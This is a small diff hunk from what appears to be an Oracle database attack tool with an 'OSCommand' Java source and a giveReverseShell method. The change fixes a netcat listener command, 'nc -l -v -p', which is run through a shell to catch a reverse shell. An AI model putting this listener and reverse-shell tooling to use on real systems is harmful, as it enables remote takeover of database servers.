@@ -202,7 +202,7 @@ CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED "OSCommand" AS
 		nc listen on the port
 		'''
 		try :
-			subprocess.call("nc -l -v {0}".format(port), shell=True)
+			subprocess.call("nc -l -v -p {0}".format(port), shell=True)
 		except KeyboardInterrupt: pass
 
 	def giveReverseShell(self, localip, localport):
